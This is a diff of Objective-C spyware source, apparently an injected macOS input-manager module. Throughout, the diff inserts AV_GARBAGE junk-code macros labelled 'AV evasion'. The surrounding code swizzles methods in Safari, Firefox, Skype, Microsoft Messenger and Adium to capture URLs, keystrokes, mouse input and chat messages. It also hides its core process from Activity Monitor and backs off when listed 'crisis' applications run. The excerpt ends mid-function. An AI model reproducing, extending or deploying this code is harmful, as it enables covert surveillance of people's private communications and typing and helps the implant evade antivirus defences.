@@ -32,6 +32,8 @@
 #import "RCSMLogger.h"
 #import "RCSMDebug.h"
 
+#import "RCSMAVGarbage.h"
+
 #define swizzleMethod(c1, m1, c2, m2) do { \
           method_exchangeImplementations(class_getInstanceMethod(c1, m1), \
                                          class_getInstanceMethod(c2, m2)); \
@@ -141,13 +143,25 @@ OSErr InjectEventHandler(const AppleEvent *ev, AppleEvent *reply, long refcon)
   verboseLog(@"Injected event handler called");
 #endif
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001 
+
   OSErr resultCode = noErr;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003 
 
   AEDesc      intDesc = {};
   SInt32      value = 0;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002 
 
   // See if we need to show the print dialog.
   OSStatus err = AEGetParamDesc(ev, 'pido', typeSInt32, &intDesc);
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_004 
 
   if (!err)
     {
@@ -157,8 +171,14 @@ OSErr InjectEventHandler(const AppleEvent *ev, AppleEvent *reply, long refcon)
 #endif
     }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_005 
+
   gBackdoorPID = value;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_006 
+
 #ifdef DEBUG_INPUT_MANAGER
   verboseLog(@"%s: running __m_eload event handler", __FUNCTION__);
 #endif
@@ -176,8 +196,14 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
   verboseLog(@"SEL newName: %s", newName);
 #endif
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002 
+
   Method methodOriginal = class_getInstanceMethod(_class, _original);
   
+  // AV evasion: only on release build
+  AV_GARBAGE_009 
+
   if (methodOriginal == nil)
     {
 #ifdef DEBUG_INPUT_MANAGER
@@ -187,9 +213,15 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
       return FALSE;
     }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+
   const char *type  = method_getTypeEncoding(methodOriginal);
   //IMP old           = method_getImplementation(methodOriginal);
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+
   if (!class_addMethod (_class, _newMethod, _newImplementation, type))
     {
 #ifdef DEBUG_INPUT_MANAGER
@@ -203,6 +235,9 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
 #endif
     }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002 
+
   Method methodNew = class_getInstanceMethod(_class, _newMethod);
   
   if (methodNew == nil)
@@ -214,8 +249,14 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
       return FALSE;
     }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+
   method_exchangeImplementations(methodOriginal, methodNew);
   
+  // AV evasion: only on release build
+  AV_GARBAGE_004
+
   return TRUE;
 }
 
@@ -228,22 +269,37 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
   [__m_MLogger enableProcessNameVisualization: YES];
 #endif
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002 
+
   // First thing we need to initialize the shared memory segments
   NSString *bundleIdentifier = [[NSBundle mainBundle] bundleIdentifier];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_005 
+
   // Init OS numbers
   [__m_MInputManager getSystemVersionMajor: &gOSMajor
                                      minor: &gOSMinor
                                     bugFix: &gOSBugFix];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_006 
+
   // TODO: Use an exclusion list instead of this
   if ([bundleIdentifier isEqualToString: @"com.apple.safari"] == YES)
-  {
+  {   
+    // AV evasion: only on release build
+    AV_GARBAGE_007 
+
     if ([self initSharedMemory] == NO)
     {
 #ifdef DEBUG_INPUT_MANAGER
       errorLog(@"Error while creating shared memory");
-#endif
+#endif   
+      // AV evasion: only on release build
+      AV_GARBAGE_008 
+
       return;
     }
     /*
@@ -252,8 +308,15 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
      name: NSApplicationWillTerminateNotification
      object: nil];
      */
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_003 
+
     if ([gUtil isLeopard]) 
-    {
+    {   
+      // AV evasion: only on release build
+      AV_GARBAGE_009 
+
       [[NSNotificationCenter defaultCenter] addObserver: self
                                                selector: @selector(startThreadCommunicator:)
                                                    name: NSApplicationWillFinishLaunchingNotification
@@ -263,12 +326,18 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
     {
 #ifdef DEBUG_INPUT_MANAGER
       verboseLog(@"running osax bundle");
-#endif
+#endif   
+      // AV evasion: only on release build
+      AV_GARBAGE_002 
+
       [NSThread detachNewThreadSelector: @selector(startCoreCommunicator)
                                toTarget: self
                              withObject: nil];
     }
     
+    // AV evasion: only on release build
+    AV_GARBAGE_007
+
     [[NSNotificationCenter defaultCenter] addObserver: self
                                              selector: @selector(closeThreadCommunicator:)
                                                  name: NSApplicationWillTerminateNotification
@@ -280,7 +349,10 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
     {
 #ifdef DEBUG_INPUT_MANAGER
       errorLog(@"Error while creating shared memory");
-#endif
+#endif   
+      // AV evasion: only on release build
+      AV_GARBAGE_001 
+
       return;
     }
     else
@@ -291,7 +363,10 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
     }
     
     if ([gUtil isLeopard]) 
-    {
+    {   
+      // AV evasion: only on release build
+      AV_GARBAGE_006
+
       [[NSNotificationCenter defaultCenter] addObserver: self
                                                selector: @selector(startThreadCommunicator:)
                                                    name: NSApplicationWillFinishLaunchingNotification
@@ -301,16 +376,25 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
     {
 #ifdef DEBUG_INPUT_MANAGER
       verboseLog(@"running osax bundle");
-#endif
+#endif   
+      // AV evasion: only on release build
+      AV_GARBAGE_002 
+
       [NSThread detachNewThreadSelector: @selector(startCoreCommunicator)
                                toTarget: self
                              withObject: nil];
     }
     
+    // AV evasion: only on release build
+    AV_GARBAGE_007
+
     [[NSNotificationCenter defaultCenter] addObserver: self
                                              selector: @selector(closeThreadCommunicator:)
                                                  name: NSApplicationWillTerminateNotification
                                                object: nil];
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_004
   }
 }
 
@@ -368,11 +452,21 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001 
+
   NSMutableData *readData;
   shMemoryCommand *shMemCommand;
   BOOL retVal = NO;
   NSProcessInfo *pi = [NSProcessInfo processInfo];  
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002 
+
   NSString *appName = [pi processName];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003 
   
 #ifdef DEBUG_INPUT_MANAGER
   infoLog(@"Crisis appName %@", appName);  
@@ -381,31 +475,61 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
   readData = [mSharedMemoryCommand readMemory: OFFT_CRISIS
                                 fromComponent: COMP_AGENT];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_004 
+
   if (readData == nil)
     return retVal;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003 
+
   shMemCommand = (shMemoryCommand *)[readData bytes];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_005 
+
 #ifdef DEBUG_INPUT_MANAGER
   infoLog(@"Crisis commandData %@", readData);  
 #endif
   
   if (shMemCommand->command == AG_START &&
       shMemCommand->commandDataSize)
-  {
+  {   
+    // AV evasion: only on release build
+    AV_GARBAGE_006 
+
     NSData *tmpListData = [[NSData alloc] initWithBytes: shMemCommand->commandData 
                                                  length: shMemCommand->commandDataSize];
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_007 
+
     UInt32 numOfNames;
     
     [tmpListData getBytes: &numOfNames length: sizeof(UInt32)];
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_003 
+
     char *tmpPtr = ((char *)[tmpListData bytes]) + sizeof(UInt32);
     
+    // AV evasion: only on release build
+    AV_GARBAGE_008 
+
     for (int i = 0; i < numOfNames; i++)
     {
 #ifdef DEBUG_INPUT_MANAGER
       infoLog(@"crisis_%d: %S", (unichar *)tmpPtr);
-#endif
+#endif   
+      // AV evasion: only on release build
+      AV_GARBAGE_009 
+
       int iLen = _utf16len((unichar*)tmpPtr) * sizeof(unichar);
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_002 
+
       NSString *tmpCrisisApp = [[NSString alloc] initWithBytes: tmpPtr 
                                                         length: iLen 
                                                       encoding: NSUTF16LittleEndianStringEncoding];
@@ -414,20 +538,42 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
       infoLog(@"AppName %@", tmpCrisisApp);  
 #endif
       
+      // AV evasion: only on release build
+      AV_GARBAGE_008 
+
       if ([appName isCaseInsensitiveLike: tmpCrisisApp])
-      {
-        [tmpCrisisApp release];
+      {   
+        // AV evasion: only on release build
+        AV_GARBAGE_005 
+
+        [tmpCrisisApp release];   
+        
+        // AV evasion: only on release build
+        AV_GARBAGE_003 
+
         retVal = YES;
         break;
       }
       
+      // AV evasion: only on release build
+      AV_GARBAGE_000
+
       [tmpCrisisApp release];
       
-      tmpPtr += iLen;
+      // AV evasion: only on release build
+      AV_GARBAGE_001 
+
+      tmpPtr += iLen;   
+      // AV evasion: only on release build
+      AV_GARBAGE_003 
+
       tmpPtr += sizeof(unichar);
     }
   }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003 
+
   [pool release];
   return retVal;
 }
@@ -435,6 +581,10 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
 + (void)startCoreCommunicator
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000 
+
   NSString *bundleIdentifier = [[NSBundle mainBundle] bundleIdentifier];
   
   if ([bundleIdentifier isEqualToString: @"com.apple.ActivityMonitor"] == YES)
@@ -443,18 +593,33 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
     infoLog(@"Starting hiding for activity Monitor");
 #endif
     
+    // AV evasion: only on release build
+    AV_GARBAGE_003 
+
 #ifndef NO_PROC_HIDING
     [self hideCoreFromAM];
 #endif
   }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001 
+
   usleep(500000);
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002 
+
   // Only for leopard
   if ([gUtil isLeopard])
-  {
+  {   
+    // AV evasion: only on release build
+    AV_GARBAGE_003 
+
     if ([self isACrisisApp])
-    {
+    {   
+      // AV evasion: only on release build
+      AV_GARBAGE_004 
+
 #ifdef DEBUG_INPUT_MANAGER
       infoLog(@"Crisis is started and app match exit now!");  
 #endif
@@ -466,6 +631,9 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
   infoLog(@"Core Communicator thread launched");  
 #endif
   
+  // AV evasion: only on release build
+  AV_GARBAGE_005 
+
   if ([bundleIdentifier isEqualToString: @"com.apple.securityagent"] == YES)
   {
 #ifdef DEBUG_INPUT_MANAGER
@@ -474,10 +642,16 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
     //
     // Avoid to inject into securityagent since we don't need it for now
     // plus it belongs to root (thus allocating a new shared memory block)
-    //
+    //   
+    // AV evasion: only on release build
+    AV_GARBAGE_006 
+
     return;
   }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_007 
+
   //
   // Here we need to start the loop for checking and reading any configuration
   // change made on the shared memory
@@ -487,13 +661,44 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
     NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
     
     [self checkAgentAtOffset: OFFT_URL];
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_009 
+
     [self checkAgentAtOffset: OFFT_APPLICATION];
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_008 
+
     [self checkAgentAtOffset: OFFT_KEYLOG];
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_007 
+
     [self checkAgentAtOffset: OFFT_MOUSE];
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_006 
+
     [self checkAgentAtOffset: OFFT_VOIP];
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_005 
+
     [self checkAgentAtOffset: OFFT_IM];
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_004 
+
     [self checkAgentAtOffset: OFFT_CLIPBOARD];
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_003 
+
     [self checkAgentAtOffset: OFFT_FILECAPTURE];
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_002
     
     //
     // Perform swizzle here
@@ -501,53 +706,102 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
     if (urlFlag == 1)
     {
       urlFlag = 2;
+      
 #ifdef DEBUG_INPUT_MANAGER
       infoLog(@"Hooking URLs");
 #endif
       
+      // AV evasion: only on release build
+      AV_GARBAGE_005 
+
       //
       // Safari
       //
       usleep(2000000);
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_004 
+
       // Safari up to 5.0
       Class className   = objc_getClass("BrowserWindowControllerMac");
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_001 
+
       Class classSource = objc_getClass("myBrowserWindowController");
       
+      // AV evasion: only on release build
+      AV_GARBAGE_002 
+
       BOOL isSafariPrior51 = NO;
       
+      // AV evasion: only on release build
+      AV_GARBAGE_003 
+
       if (className == nil)
       {
         className = objc_getClass("BrowserWindowController");
+        
+        // AV evasion: only on release build
+        AV_GARBAGE_004 
+
         if (className != nil)
           isSafariPrior51 = YES;
       }
       
       if (className != nil)
-      {
+      {   
+        // AV evasion: only on release build
+        AV_GARBAGE_005 
+
         URLStartAgent();
+        
+        // AV evasion: only on release build
+        AV_GARBAGE_003 
+
         if (isSafariPrior51)
         {
 #ifdef DEBUG_INPUT_MANAGER
           warnLog(@"Safari < 5.1 (hook)");
-#endif
+#endif   
+          // AV evasion: only on release build
+          AV_GARBAGE_006
+
           swizzleByAddingIMP (className, @selector(webFrameLoadCommitted:),
                               class_getMethodImplementation(classSource, @selector(webFrameLoadCommittedHook:)),
                               @selector(webFrameLoadCommittedHook:));
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_004
         }
         else
         {
 #ifdef DEBUG_INPUT_MANAGER
           warnLog(@"Safari >= 5.1 (hook)");
-#endif
+#endif   
+          // AV evasion: only on release build
+          AV_GARBAGE_003 
+
           swizzleByAddingIMP (className, @selector(_setLocationFieldText:),
                               class_getMethodImplementation(classSource, @selector(_setLocationFieldTextHook:)),
                               @selector(_setLocationFieldTextHook:));
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_002 
+
           swizzleByAddingIMP (className, @selector(closeCurrentTab:),
                               class_getMethodImplementation(classSource, @selector(closeCurrentTabHook:)),
                               @selector(closeCurrentTabHook:));
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_001 
+
           swizzleByAddingIMP (className, @selector(didSelectTabViewItem),
                               class_getMethodImplementation(classSource, @selector(didSelectTabViewItemHook)),
                               @selector(didSelectTabViewItemHook));
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_000
         }
       }
       else
@@ -558,12 +812,22 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
       }
       // End of Safari
       
+      // AV evasion: only on release build
+      AV_GARBAGE_003 
+
       //
       // Firefox 3 - Massimo Chiodini
       //
       NSString *applicationName  = [[[NSBundle mainBundle] bundlePath] lastPathComponent];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_002 
+
       NSString *firefoxAppName   = [[NSString alloc] initWithUTF8String: "Firefox.app"];
       
+      // AV evasion: only on release build
+      AV_GARBAGE_001 
+
       NSComparisonResult result = [firefoxAppName compare: applicationName
                                                   options: NSCaseInsensitiveSearch
                                                     range: NSMakeRange(0, [applicationName length])
@@ -571,45 +835,87 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
       
 #ifdef DEBUG_INPUT_MANAGER
       infoLog(@"Comparing %@ vs. %@ (%d)", applicationName, firefoxAppName, result);
-#endif
+#endif   
+      // AV evasion: only on release build
+      AV_GARBAGE_006
+
       if (result == NSOrderedSame)
       {
 #ifdef DEBUG_INPUT_MANAGER
         infoLog(@"Hooking fairfocs baby!");
-#endif  
+#endif     
+        // AV evasion: only on release build
+        AV_GARBAGE_006
+
         Class className = objc_getClass("NSWindow");
         
+        // AV evasion: only on release build
+        AV_GARBAGE_007
+
         swizzleMethod(className, @selector(setTitle:),
                       className, @selector(setTitleHook:));
         
+        // AV evasion: only on release build
+        AV_GARBAGE_004        
       }
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_006 
+
       [firefoxAppName release];
       // End of Firefox 3
     }
     else if (urlFlag == 3)
     {
       urlFlag = 0;
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_003 
+
 #ifdef DEBUG_INPUT_MANAGER
       infoLog(@"Unhooking URLs");
 #endif
       
       Class className       = objc_getClass("BrowserWindowControllerMac");
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_009 
+
       BOOL isSafariPrior51  = NO;
       
+      // AV evasion: only on release build
+      AV_GARBAGE_005
+
       if (className == nil)
-      {
+      {   
+        // AV evasion: only on release build
+        AV_GARBAGE_001
+
         className = objc_getClass("BrowserWindowController");
+        
+        // AV evasion: only on release build
+        AV_GARBAGE_004 
+
         if (className != nil)
           isSafariPrior51 = YES;
       }
       
+      // AV evasion: only on release build
+      AV_GARBAGE_002 
+
       if (className != nil)
-      {
+      {   
+        // AV evasion: only on release build
+        AV_GARBAGE_009 
+
         if (isSafariPrior51)
         {
 #ifdef DEBUG_INPUT_MANAGER
           warnLog(@"Safari < 5.1 (unhook)");
-#endif
+#endif   
+          // AV evasion: only on release build
+          AV_GARBAGE_008
+
           swizzleMethod(className, @selector(webFrameLoadCommitted:),
                         className, @selector(webFrameLoadCommittedHook:));
         }
@@ -617,13 +923,27 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
         {
 #ifdef DEBUG_INPUT_MANAGER
           warnLog(@"Safari >= 5.1 (unhook)");
-#endif
+#endif   
+          // AV evasion: only on release build
+          AV_GARBAGE_007 
+
           swizzleMethod(className, @selector(_setLocationFieldText:),
                         className, @selector(_setLocationFieldTextHook:));
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_008
+
           swizzleMethod(className, @selector(closeCurrentTab:),
                         className, @selector(closeCurrentTabHook:));
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_009
+
           swizzleMethod(className, @selector(didSelectTabViewItem),
                         className, @selector(didSelectTabViewItemHook));
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_002
         }
       }
       else
@@ -633,14 +953,31 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
 #endif
       }
       
+      // AV evasion: only on release build
+      AV_GARBAGE_002 
+
       // firefox 3
       NSString *application_name  = [[[NSBundle mainBundle] bundlePath] lastPathComponent];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_001 
+
       NSString *firefox_app       = [[NSString alloc] initWithUTF8String: "Firefox.app"];
       
+      // AV evasion: only on release build
+      AV_GARBAGE_008
+
       NSRange strRange;
       strRange.location = 0;
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_003 
+
       strRange.length   = [application_name length];
       
+      // AV evasion: only on release build
+      AV_GARBAGE_007 
+
       NSComparisonResult firefox_res = [firefox_app compare: application_name
                                                     options: NSCaseInsensitiveSearch
                                                       range: strRange
@@ -648,58 +985,121 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
 #ifdef DEBUG_INPUT_MANAGER
       infoLog(@"Comparing %@ vs. %@ (%d)", application_name, firefox_app, firefox_res);
 #endif      
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_009
+
       if (firefox_res == NSOrderedSame)
       {
 #ifdef DEBUG_INPUT_MANAGER
         infoLog(@"Hooking fairfocs baby!");
 #endif
         
+        // AV evasion: only on release build
+        AV_GARBAGE_006 
+
         Class className = objc_getClass("NSWindow");
+        
+        // AV evasion: only on release build
+        AV_GARBAGE_005 
+
         swizzleMethod(className, @selector(setTitle:),
                       className, @selector(setTitleHook:));
       }
       
+      // AV evasion: only on release build
+      AV_GARBAGE_004
+
       [firefox_app release];
     }
     
+    // AV evasion: only on release build
+    AV_GARBAGE_003 
+
     if (appFlag == 1)
-    {
+    {   
+      // AV evasion: only on release build
+      AV_GARBAGE_001 
+
       appFlag = 2;
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_003 
+
       __m_MAgentApplication *appAgent = [__m_MAgentApplication sharedInstance];
       
+      // AV evasion: only on release build
+      AV_GARBAGE_002
+
       [appAgent start];
       
+      // AV evasion: only on release build
+      AV_GARBAGE_005
+
 #ifdef DEBUG_INPUT_MANAGER
       infoLog(@"Hooking Application agent");
 #endif
     }
     else if (appFlag == 3)
-    {
+    {   
+      // AV evasion: only on release build
+      AV_GARBAGE_007 
+
       appFlag = 0;
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_006 
+
       __m_MAgentApplication *appAgent = [__m_MAgentApplication sharedInstance];
       
+      // AV evasion: only on release build
+      AV_GARBAGE_008
+
       [appAgent stop];
       
+      // AV evasion: only on release build
+      AV_GARBAGE_009 
+
 #ifdef DEBUG_INPUT_MANAGER
       infoLog(@"Stopping Application agent");
 #endif
     }
     
+    // AV evasion: only on release build
+    AV_GARBAGE_002 
+
     if (keyboardFlag == 1)
     {
-      keyboardFlag = 2;
+      keyboardFlag = 2;  
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_003 
+
       keylogAgentIsActive = 1;
       
+      // AV evasion: only on release build
+      AV_GARBAGE_004 
+
       Class className = objc_getClass("NSWindow");
       
+      // AV evasion: only on release build
+      AV_GARBAGE_005 
+
       if (mouseFlag == 0 || mouseAgentIsActive == 0)
       {
 #ifdef DEBUG_INPUT_MANAGER
         infoLog(@"Hooking keyboard");
 #endif
         
+        // AV evasion: only on release build
+        AV_GARBAGE_006 
+
         swizzleMethod(className, @selector(hookKeyboardAndMouse:),
                       className, @selector(sendEvent:));
+        
+        // AV evasion: only on release build
+        AV_GARBAGE_007 
+
       }
       else
       {
@@ -708,50 +1108,101 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
 #endif
       }
       
+      // AV evasion: only on release build
+      AV_GARBAGE_004 
+
       swizzleMethod(className, @selector(becomeKeyWindowHook),
                     className, @selector(becomeKeyWindow));
       
+      // AV evasion: only on release build
+      AV_GARBAGE_009 
+
       swizzleMethod(className, @selector(resignKeyWindowHook),
                     className, @selector(resignKeyWindow));
     }
     else if (keyboardFlag == 3)
-    {
-      keyboardFlag = 0;
+    {   
+      // AV evasion: only on release build
+      AV_GARBAGE_001 
+
+      keyboardFlag = 0;  
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_002 
+
       keylogAgentIsActive = 0;
       
+      // AV evasion: only on release build
+      AV_GARBAGE_008 
+
 #ifdef DEBUG_INPUT_MANAGER
       infoLog(@"Unhooking keyboard");
 #endif
       Class className = objc_getClass("NSWindow");
       
+      // AV evasion: only on release build
+      AV_GARBAGE_003 
+
       if (mouseFlag == 0)
-      {
+      {   
+        // AV evasion: only on release build
+        AV_GARBAGE_004 
+
         swizzleMethod(className, @selector(hookKeyboardAndMouse:),
                       className, @selector(sendEvent:));
       }
       
+      // AV evasion: only on release build
+      AV_GARBAGE_007
+
       swizzleMethod(className, @selector(becomeKeyWindowHook),
                     className, @selector(becomeKeyWindow));
       
+      // AV evasion: only on release build
+      AV_GARBAGE_006
+
       swizzleMethod(className, @selector(resignKeyWindowHook),
                     className, @selector(resignKeyWindow));
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_000 
+
     }
     
     if (mouseFlag == 1)
-    {
-      mouseFlag = 2;
+    {   
+      // AV evasion: only on release build
+      AV_GARBAGE_003 
+
+      mouseFlag = 2;  
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_002
+
       mouseAgentIsActive = 1;
       
+      // AV evasion: only on release build
+      AV_GARBAGE_008 
+
       Class className = objc_getClass("NSWindow");
       
+      // AV evasion: only on release build
+      AV_GARBAGE_007 
+
       if (keyboardFlag == 0 || keylogAgentIsActive == 0)
       {
 #ifdef DEBUG_INPUT_MANAGER
         infoLog(@"Hooking mouse");
 #endif
         
+        // AV evasion: only on release build
+        AV_GARBAGE_002 
+
         swizzleMethod(className, @selector(hookKeyboardAndMouse:),
                       className, @selector(sendEvent:));
+        
+        // AV evasion: only on release build
+        AV_GARBAGE_004
       }
       else
       {
@@ -762,104 +1213,202 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
     }
     else if (mouseFlag == 3)
     {
-      mouseFlag = 0;
+      mouseFlag = 0; 
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_009 
+
       mouseAgentIsActive = 0;
       
 #ifdef DEBUG_INPUT_MANAGER
       infoLog(@"Unhooking mouse");
 #endif
       
+      // AV evasion: only on release build
+      AV_GARBAGE_006 
+
       if (keyboardFlag == 0)
-      {
+      {   
+        // AV evasion: only on release build
+        AV_GARBAGE_001 
+
         Class className = objc_getClass("NSWindow");
         
+        // AV evasion: only on release build
+        AV_GARBAGE_003 
+
         swizzleMethod(className, @selector(hookKeyboardAndMouse:),
-                      className, @selector(sendEvent:));
+                      className, @selector(sendEvent:));  
+        
+        // AV evasion: only on release build
+        AV_GARBAGE_001
       }
     }
     
+    // AV evasion: only on release build
+    AV_GARBAGE_005 
+
     if (imFlag == 1)
-    {
+    {   
+      // AV evasion: only on release build
+      AV_GARBAGE_001 
+
       imFlag = 2;
 #ifdef DEBUG_INPUT_MANAGER
       infoLog(@"Hooking IMs");
 #endif
       
+      // AV evasion: only on release build
+      AV_GARBAGE_003 
+
       Class className;
       Class classSource;
       
       if ([bundleIdentifier isEqualToString: @"com.microsoft.Messenger"])
-      {
+      {   
+        // AV evasion: only on release build
+        AV_GARBAGE_002 
+
         // Microsoft Messenger
-        className   = objc_getClass("IMWebViewController");
+        className   = objc_getClass("IMWebViewController");   
+        
+        // AV evasion: only on release build
+        AV_GARBAGE_003 
+
         classSource = objc_getClass("myIMWebViewController");
         
+        // AV evasion: only on release build
+        AV_GARBAGE_005 
+
         swizzleByAddingIMP(className, @selector(ParseAndAppendUnicode:inLength:inStyle:fIndent:fParseEmoticons:fParseURLs:inSenderName:fLocalUser:),
                            class_getMethodImplementation(classSource, @selector(ParseAndAppendUnicodeHook:inLength:inStyle:fIndent:fParseEmoticons:fParseURLs:inSenderName:fLocalUser:)),
                            @selector(ParseAndAppendUnicodeHook:inLength:inStyle:fIndent:fParseEmoticons:fParseURLs:inSenderName:fLocalUser:));
         
-        className   = objc_getClass("IMWindowController");
+        // AV evasion: only on release build
+        AV_GARBAGE_001 
+
+        className   = objc_getClass("IMWindowController");   
+        
+        // AV evasion: only on release build
+        AV_GARBAGE_002 
+
         classSource = objc_getClass("myIMWindowController");
         
+        // AV evasion: only on release build
+        AV_GARBAGE_003 
+
         swizzleByAddingIMP(className, @selector(SendMessage:cchText:inHTML:),
                            class_getMethodImplementation(classSource, @selector(SendMessageHook:cchText:inHTML:)),
                            @selector(SendMessageHook:cchText:inHTML:));
         
+        // AV evasion: only on release build
+        AV_GARBAGE_004
+        
       }
       else if([bundleIdentifier isEqualToString: @"com.skype.skype"])
-      {
+      {   
+        // AV evasion: only on release build
+        AV_GARBAGE_007 
+
         // Skype
         // In order to avoid a linker error for a missing implementation
         Class className   = objc_getClass("SkypeChat");
+        
+        // AV evasion: only on release build
+        AV_GARBAGE_009 
+
         Class classSource = objc_getClass("mySkypeChat");
         
+        // AV evasion: only on release build
+        AV_GARBAGE_003 
+
         swizzleByAddingIMP (className, @selector(isMessageRecentlyDisplayed:),
                             class_getMethodImplementation(classSource, @selector(isMessageRecentlyDisplayedHook:)),
                             @selector(isMessageRecentlyDisplayedHook:));
+        
+        // AV evasion: only on release build
+        AV_GARBAGE_008
       }
       else if([bundleIdentifier isEqualToString: @"com.adiumX.adiumX"])
       {
 #ifdef DEBUG_IM_ADIUM
         infoLog(@"Hooking Adium");
-#endif
+#endif   
+        // AV evasion: only on release build
+        AV_GARBAGE_003 
+
         Class className   = objc_getClass("AIContentController");
+        
+        // AV evasion: only on release build
+        AV_GARBAGE_003 
+
         Class classSource = objc_getClass("myAIContentController");
         
+        // AV evasion: only on release build
+        AV_GARBAGE_003 
+
         swizzleByAddingIMP(className, @selector(finishSendContentObject:), 
                            class_getMethodImplementation(classSource, @selector(myfinishSendContentObject:)),
                            @selector(myfinishSendContentObject:));
         
+        // AV evasion: only on release build
+        AV_GARBAGE_002 
+
         swizzleByAddingIMP(className, @selector(finishReceiveContentObject:), 
                            class_getMethodImplementation(classSource, @selector(myfinishReceiveContentObject:)),
                            @selector(myfinishReceiveContentObject:));
+        
+        // AV evasion: only on release build
+        AV_GARBAGE_005
       }
     }
     else if (imFlag == 3)
-    {
+    {   
+      // AV evasion: only on release build
+      AV_GARBAGE_009 
+
       imFlag = 0;
 #ifdef DEBUG_INPUT_MANAGER
       infoLog(@"Unhooking IMs");
-#endif
+#endif   
+      // AV evasion: only on release build
+      AV_GARBAGE_006 
+
       // In order to avoid a linker error for a missing implementation
       Class className = objc_getClass("SkypeChat");
       
+      // AV evasion: only on release build
+      AV_GARBAGE_003 
+
